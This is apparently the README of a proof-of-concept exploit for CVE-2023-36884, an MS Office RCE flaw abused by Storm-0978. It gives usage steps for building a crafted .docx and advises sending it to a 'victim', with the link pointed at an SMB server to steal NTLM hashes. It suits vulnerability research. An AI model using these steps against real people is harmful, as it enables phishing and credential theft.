# CVE-2023-36884: MS Office HTML RCE with crafted documents

On July 11, 2023, Microsoft released a patch aimed at addressing multiple actively exploited Remote Code Execution (RCE) vulnerabilities. This action also shed light on a phishing campaign orchestrated by a threat actor known as Storm-0978, specifically targeting organizations in Europe and North America. At the heart of this campaign was a zero-day vulnerability, designated as CVE-2023-36884, which allowed the attacker to exploit Windows search files through meticulously crafted Office Open eXtensible Markup Language (OOXML) documents featuring geopolitical lures related to the Ukraine World Congress (UWC). Although a workaround had initially been proposed to mitigate this vulnerability, Microsoft released an Office Defense in Depth update on August 8, 2023, effectively breaking the exploitation chain that had led to RCE via Windows search (`*.search-ms`) files.

## Blog Post
This exploit script is written for a CVE analysis on [vsociety](https://www.vicarius.io/vsociety/).

## Usage
Install PIP packages:
```
pip install python-docx pywin32                                                         
```
Create an example.html file and start a Python HTTP web server:
```
New-Item -Path "example.html" - ItemType File
python -m http.server 8888
```
Then, run the script:
```
python gen_docx_with_rtf_altchunk.py merged.docx autolinked.rtf http://localhost:8888/example.html
```
Now the generated file can be shared with your victim via email or something else. The link can be referred to your SMB server to steal the victim's NTLM hash or to an HTML file that contains an iframe with a reference to a Windows Search file just as in the original malware. Due to a lack of further information, the exact exploitation can not be shown.

## Disclaimer
This exploit script has been created solely for the purposes of research and for the development of effective defensive techniques. It is not intended to be used for any malicious or unauthorized activities. The author and the owner of the script disclaim any responsibility or liability for any misuse or damage caused by this software. Users are urged to use this software responsibly and only in accordance with applicable laws and regulations. Use responsibly.
